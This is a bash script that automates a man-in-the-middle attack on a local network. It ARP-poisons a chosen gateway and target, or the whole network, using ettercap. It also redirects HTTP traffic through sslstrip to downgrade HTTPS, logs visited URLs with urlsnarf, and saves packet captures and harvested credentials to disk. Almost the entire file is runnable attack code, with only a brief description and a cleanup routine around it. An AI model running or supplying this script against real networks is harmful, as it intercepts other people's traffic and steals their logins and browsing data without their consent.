#!/usr/bin/env bash

#[ Description
#|  Automatic MITM (arp poisoning) shell script that collects
#|  all packets, including SSL traffic collected with sslstrip
#[  and logs all the URLs using uslsnarf from dsniff collection.
#
#[ Requirements
#|  sslstrip
#|  dsniff
#|  ettercap
#[  iptables

IFACES=$(ifconfig | grep '  $' | cut -d " " -f1)

echo -n "What interface to use? ie: "$IFACES":"
read -e IFACE
echo -n "Name of 'Session'? (name of the folder that will be created with all the log files): "
read -e SESSION
echo -n "Gateway IP - LEAVE BLANK IF YOU WANT TO ARP WHOLE NETWORK: "
read -e ROUTER
echo -n "Target IP - LEAVE BLANK IF YOU WANT TO ARP WHOLE NETWORK: "
read -e VICTIM

mkdir /root/$SESSION/

# Setup network
echo "[+] Setting up iptables"
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
echo 1 > /proc/sys/net/ipv4/ip_forward
sleep 1

# Sslstrip
echo "[+] Starting sslstrip..."
xterm -geometry 75x15+1+200 -T sslstrip -e sslstrip -f -s -k -w /root/$SESSION/$SESSION.log &
sleep 2

# urlsnarf
echo "[+] Starting urlsnarf..."
urlsnarf -i $IFACE | grep http > /root/$SESSION/$SESSION.txt &
sleep 1


# Ettercap
echo
echo "[+] Starting ettercap..."
xterm -geometry 73x25+1+300 -T ettercap -s -sb -si +sk -sl 5000 -hold -e ettercap -Tq -P autoadd -i $IFACE -w /root/$SESSION/$SESSION.pcap -L /root/$SESSION/$SESSION -M arp:remote /"$ROUTER"/ /"$VICTIM"/ &
cat /proc/sys/net/ipv4/ip_forward
iptables -t nat -L

sleep 1

echo
echo "[+] IMPORTANT..."
echo "After you have finished please close this script and clean up properly by hitting y"
read WISH

# Clean up
if [ $WISH = "y" ] ; then
   echo
   echo "[+] Cleaning up and resetting iptables..."
   killall sslstrip
   killall ettercap
   killall urlsnarf
   killall xterm
   echo "0" > /proc/sys/net/ipv4/ip_forward
   iptables --flush
   iptables --table nat --flush
   iptables --delete-chain
   iptables --table nat --delete-chain
   etterlog -p -i /root/$SESSION/$SESSION.eci

   echo "[+] Clean up successful...Bye!"
   exit

fi
exit
